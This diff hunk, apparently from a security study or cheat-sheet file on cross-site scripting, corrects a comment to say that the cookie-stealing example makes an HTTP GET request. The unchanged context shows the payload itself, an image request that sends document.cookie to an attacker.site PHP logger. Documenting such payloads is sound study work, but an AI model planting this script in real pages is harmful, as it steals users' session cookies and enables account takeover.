@@ -667,7 +667,7 @@ var i = new Image();
 i.src="http://attacker.site/log.php?q="+document.cookie;
 </script>
 ```
-> Makes a POST request to a a php log because victim site points request to attacker site to load image.
+> Makes a HTTP GET request to a a php log because victim site points request to attacker site to load image.
 
 ``` php
 <?php
